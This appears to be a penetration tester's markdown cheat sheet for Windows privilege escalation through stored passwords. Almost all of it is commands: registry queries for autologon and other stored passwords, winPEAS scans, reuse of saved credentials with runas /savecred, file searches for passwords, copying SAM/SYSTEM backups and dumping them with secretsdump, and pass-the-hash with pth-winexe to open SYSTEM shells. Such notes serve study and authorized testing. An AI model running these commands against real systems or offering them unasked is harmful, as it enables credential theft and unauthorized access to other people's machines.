# Passwords
-------

## Registry
--------
Searching registry keys and values that contain "password"
```
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

```
.\winPEASany.exe quiet filesinfo userinfo
```

Autologon credentials:
```
REG QUERY "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon" /v DefaultUserName /reg:64


REG QUERY "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon" /v DefaultPassword /reg:64
```

Then we can spawn a shell using winexe:
```
winexe -U 'admin@password123' //IP cmd.exe
winexe -U 'admin@password123' --system //IP cmd.exe
```

Manual search:
```
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```


## Saved Creds
--------
```
.\winPEASany.exe quiet cmd windowscreds
```

```
cmdkey /list
```

If we have a saved cred in memory we can run any command as that user.
```
runas /savecred /user:admin C:\windows\system32\cmd.exe
```

## Configurations Files
--------

```
.\winPEASany.exe quiet cmd filesinfo
```

```
dir /s *pass* == *.config
```

```
findstr /si password *.xml *.ini *.txt
```

## SAM
-----
If we have ability to read SAM and SYSTEM files, we can copy them and extract them using pypykatz, pwdump or mimikatz.

Backups of the files may exist in:
```
C:\Windows\Repair
```

```
C:\Windows\System32\config\RegBack
```

Or we can use the method shadow copy.

- [ ] check how to do that with pypykatz.

Extracting using secretsdump:
```bash
python3 /opt/wintools/impacket/examples/secretsdump.py -sam SAM -system SYSTEM LOCAL 
```

Pass the hash using pth-winexe:
```
pth-winexe -U 'admin%LM:NT' //IP cmd.exe

pth-winexe --system -U 'admin%LM:NT' //IP cmd.exe
```